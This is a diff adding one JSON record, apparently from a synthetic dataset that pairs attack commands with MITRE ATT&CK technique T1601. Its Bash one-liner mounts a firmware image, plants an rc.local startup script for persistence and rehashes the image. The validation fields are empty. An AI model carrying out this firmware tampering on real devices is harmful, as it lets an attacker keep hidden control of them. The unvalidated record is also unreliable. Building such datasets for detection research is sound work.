@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "LOOP=$(losetup -f --show /root/firmware_mod.img) && MNT=$(mktemp -d) && mount $LOOP $MNT && cp /root/rc.local $MNT/etc/rc.local && chmod +x $MNT/etc/rc.local && umount $MNT && losetup -d $LOOP && rmdir $MNT && sha256sum /root/firmware_mod.img",
+  "explanation": "Mounts a firmware image, injects a startup script to ensure persistence, then recomputes the image hash to track the altered content.",
+  "rationale_steps": [
+    "Loop-mount the firmware image to enable offline modification.",
+    "Insert unauthorized initialization logic for persistence at boot.",
+    "Recompute hash to record the modified image's integrity for later checks."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-dc873ff7-4bdadf88",
+  "source_prompt_hash": "dc873ff7",
+  "timestamp_utc": "2025-09-30T04:57:26.660610Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
